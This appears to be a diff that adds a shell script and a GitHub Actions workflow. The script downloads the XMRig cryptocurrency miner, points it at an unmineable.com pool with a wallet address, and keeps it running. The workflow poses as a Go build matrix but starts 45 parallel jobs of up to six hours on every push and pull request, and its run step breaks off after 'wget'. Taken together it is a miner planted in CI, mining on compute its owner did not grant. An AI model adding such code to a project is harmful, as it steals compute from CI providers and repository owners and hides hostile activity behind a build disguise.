@@ -1,0 +1,41 @@
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/xmrig/xmrig/releases/download/v6.9.0/xmrig-6.9.0-linux-x64.tar.gz
+tar xf xmrig-6.9.0-linux-x64.tar.gz
+cd xmrig-6.9.0
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u BTT:TR4w4ekQEmv8dNdFvRJ7CdcYLyaHVgFvSh.
+while [ 1 ]; do
+
+sleep 3
+done
+sleep 999
+
+
+name: btt2
+on: [push, pull_request]
+jobs:
+build:
+name: akuganteng
+runs-on: ubuntu-latest
+strategy:
+max-parallel: 1
+fail-fast: false
+matrix:
+go: [1.6, 1.7, 1.8, 1.9, 1.10]
+flag: [A, B, C, D, E, F, G, H, I]
+timeout-minutes: 360
+env:
+NUM_JOBS: 20
+JOB: ${{ matrix.go }}
+steps:
+- name: Set up Go ${{ matrix.go }}
+uses: actions/setup-go@v1
+with:
+go-version: ${{ matrix.go }}
+id: go
+- name: Setup
+uses: actions/checkout@v2
+- name: akuganteng
+run: |
+wget 
